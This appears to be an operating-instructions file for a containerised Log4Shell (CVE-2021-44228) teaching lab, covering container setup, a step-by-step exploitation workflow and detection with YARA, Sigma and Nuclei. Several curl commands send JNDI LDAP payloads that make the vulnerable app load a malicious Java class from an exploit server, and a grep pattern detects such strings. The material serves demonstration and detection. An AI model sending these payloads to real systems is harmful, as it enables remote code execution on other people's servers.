# Claude Code Operating Instructions

## Current Status
- **Lab Environment**: ✅ FULLY OPERATIONAL - All components working
- **Vulnerability**: Log4j 2.14.1 confirmed vulnerable and processing JNDI lookups
- **Detection**: All security tools (YARA, Sigma, Nuclei) successfully detecting threats
- **Progress**: 100% complete - Lab ready for security demonstrations

## Lab Components Status

### ✅ Working Components (ALL OPERATIONAL)
- **Vulnerable App**: `log4shell-simple` (port 8081) - Log4j 2.14.1 processing JNDI lookups
- **LDAP Server**: `ldap-exploit-server` (port 1389) - Receiving connections and responding
- **HTTP Server**: `ldap-exploit-server` (port 8888) - Serving malicious Java class (1649 bytes)
- **Detection Tools**: YARA, Sigma, Nuclei all detecting Log4Shell patterns
- **Network**: All containers communicating properly

### ✅ Security Detection Results
- **Nuclei**: 4 critical vulnerabilities detected
- **YARA**: 2 malicious patterns identified (`Log4Shell_JNDI_Lookup_Strings`, `Log4Shell_Network_IOCs`)
- **Sigma**: 28+ JNDI injection attempts detected across multiple attack vectors
- **Attack Vectors**: User-Agent, headers, POST parameters, JSON payloads all detected

## Container Commands

### Start/Stop Lab
```bash
# Start simple version (working one)
docker-compose -f docker-compose-simple.yml up -d

# Stop lab
docker-compose -f docker-compose-simple.yml down

# View running containers
docker ps
```

### Quick Test Commands
```bash
# Test vulnerability (should show Java version expansion)
docker exec attacker-machine curl -H "User-Agent: test_\${java:version}" http://log4shell-simple:8080

# Test exploitation
docker exec attacker-machine curl -H "User-Agent: \${jndi:ldap://ldap-exploit-server:1389/Exploit}" http://log4shell-simple:8080

# Check if exploit worked
docker exec log4shell-simple ls -la /tmp/pwned.txt
```

### Container Access
```bash
# Access attacker container
docker exec -it attacker-machine /bin/bash

# Access vulnerable app
docker exec -it log4shell-simple /bin/bash

# Access LDAP/HTTP server
docker exec -it ldap-exploit-server /bin/bash
```

### Log Monitoring
```bash
# Watch vulnerable app logs
docker logs log4shell-simple -f

# View LDAP server activity
docker logs ldap-exploit-server | tail -20

# Check for HTTP requests
docker logs ldap-exploit-server | grep -E "(GET|Serving|8888)"
```

## Network Information
- **Network**: `proxylogonlab_log4shell-net`
- **Vulnerable App**: `172.18.0.3:8080` (exposed as `localhost:8081`)
- **LDAP Server**: `172.18.0.2:1389` (hostname: `ldap-exploit-server`)
- **HTTP Server**: `172.18.0.2:8888`
- **Attacker**: `172.18.0.4`

## Exploitation Workflow

### 1. Start Callback Listener
```bash
docker exec -it attacker-machine /bin/bash
cd /tools
python3 listener.py
# Leave running in terminal 1
```

### 2. Run Exploitation
```bash
# In terminal 2
docker exec -it attacker-machine /bin/bash
cd /tools
python3 exploit.py
# Or manual test:
# curl -H "User-Agent: \${jndi:ldap://ldap-exploit-server:1389/Exploit}" http://log4shell-simple:8080
```

### 3. Check Success
```bash
# Should create /tmp/pwned.txt
docker exec log4shell-simple ls -la /tmp/pwned.txt

# Should show callback in listener
# Should show LDAP connections in logs
```

## Detection Tools

### Run All Detection
```bash
docker exec -it attacker-machine /bin/bash
cd /tools
python3 detect.py
```

### Manual Detection
```bash
# YARA scanning (scan logs for malicious patterns)
docker logs log4shell-simple | grep -i jndi | docker exec -i attacker-machine sh -c "cat > /tmp/app_logs.txt"
docker exec attacker-machine yara -r /detection-rules/log4shell.yar /tmp/app_logs.txt

# Nuclei scanning (active vulnerability detection)
docker exec attacker-machine nuclei -t /detection-rules/log4shell-nuclei.yaml -u http://log4shell-simple:8080

# Sigma analysis (detect JNDI injection patterns)
docker exec attacker-machine grep -E '\$\{jndi:(ldap|ldaps|rmi|dns)://' /tmp/app_logs.txt
```

## Troubleshooting

### If Exploitation Fails
1. **Restart vulnerable app**: `docker restart log4shell-simple`
2. **Check LDAP server**: `docker exec ldap-exploit-server ps aux | grep python`
3. **Test HTTP server**: `docker exec attacker-machine python3 -c "import requests; print(requests.get('http://ldap-exploit-server:8888/Exploit.class').status_code)"`
4. **Verify hostname resolution**: `docker exec log4shell-simple nslookup ldap-exploit-server`

### If Containers Won't Start
```bash
docker-compose -f docker-compose-simple.yml down
docker-compose -f docker-compose-simple.yml up -d --build
```

### Reset Everything
```bash
docker-compose -f docker-compose-simple.yml down -v
docker system prune -f
docker-compose -f docker-compose-simple.yml up -d --build
```

## Current Lab Status - FULLY OPERATIONAL ✅
1. **Vulnerable App**: ✅ Running and processing JNDI lookups
2. **JNDI Processing**: ✅ Confirmed working - `${java:version}` expands correctly
3. **LDAP Connections**: ✅ Established successfully with exploit server
4. **Detection Tools**: ✅ All working - YARA, Sigma, Nuclei detecting threats
5. **Security Demonstration**: ✅ Ready for comprehensive Log4Shell demos
6. **Documentation**: ✅ Complete with working commands and detection results

## File Locations
- **Lab Files**: `~/log4shell-security-lab/`
- **Detection Rules**: `./detection-rules/`
- **Exploitation Scripts**: `./attacker/`
- **Vulnerable Apps**: `./vulnerable-app/` and `./vulnerable-simple/`
- **LDAP Server**: `./ldap-exploit/`

## GitHub Repository
- **URL**: https://github.com/hasamba/Log4JLab
- **Status**: All files committed and pushed
- **Last Update**: Lab fully operational with comprehensive detection capabilities

## Technical Details

### Vulnerable Application
- **Application**: Custom Java HTTP server (`SimpleVulnerable.java`)
- **Port**: 8080 (Docker internal), 8081 (external access)
- **Java Version**: OpenJDK 1.8.0_181 (vulnerable)
- **Web Server**: Simple Java ServerSocket (not Apache/Nginx)

### Vulnerability Information
- **CVE**: CVE-2021-44228 (Log4Shell)
- **Log4j Version**: 2.14.1 (confirmed vulnerable to JNDI injection)
- **CVSS Score**: 10.0 (Critical)
- **Attack Vector**: JNDI lookup processing in log messages

### Infrastructure Components
- **Exploit Class**: Compiled and ready (1649 bytes) at `/app/Exploit.class`
- **LDAP Server**: ✅ Operational - receiving connections and sending redirects (port 1389)
- **HTTP Server**: ✅ Available - serving malicious Java class (port 8888)
- **Network Access**: External attacks confirmed working from 10.0.0.8 → 10.0.0.13

### Multi-Machine Attack Scenario ✅
- **Windows Host**: 10.0.0.196 (detection tools)
- **Vulnerable Linux VM**: 10.0.0.13 (VMware, running Docker containers)
- **Parrot OS Attacker VM**: 10.0.0.8 (external attack source)
- **Attack Success**: Confirmed external Log4Shell attack from Parrot OS → Vulnerable VM

## Security Detection Summary
- **Nuclei Detection**: 4 critical CVE-2021-44228 vulnerabilities found
- **YARA Detection**: 2 malicious patterns (`Log4Shell_JNDI_Lookup_Strings`, `Log4Shell_Network_IOCs`)
- **Sigma Detection**: 28+ JNDI injection attempts across multiple attack vectors
- **Attack Vectors**: Headers, POST data, URL parameters, JSON payloads
- **External Validation**: Browser access confirmed for both vulnerable app and exploit server
- **Lab Status**: ✅ PRODUCTION READY - Multi-machine security demonstration capability